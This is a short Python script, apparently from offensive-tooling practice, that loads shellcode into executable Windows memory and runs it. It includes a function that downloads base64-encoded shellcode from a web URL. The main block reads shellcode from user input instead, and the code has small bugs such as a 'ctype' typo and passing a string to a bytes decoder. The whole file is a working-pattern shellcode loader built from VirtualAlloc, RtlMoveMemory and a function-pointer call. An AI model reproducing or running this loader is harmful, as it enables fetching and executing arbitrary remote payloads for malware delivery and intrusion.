# Retrieves shellcode stored on web api and executes it in buffer of memory expects code to be base64 encoded
import requests

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    r = requests.get(url)
    shellcode = base64.decodebytes(r.text)
    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctype.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__=='__main__':
    shellcode = input("Enter shellcode: ")
    run(shellcode)